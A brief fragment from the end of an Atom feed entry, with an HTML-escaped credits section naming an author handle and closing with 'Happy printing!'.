&#xA;&lt;h3&gt;Credits&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Author: @kr3bz&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Happy printing!&lt;/p&gt;</summary>
  </entry>
</feed>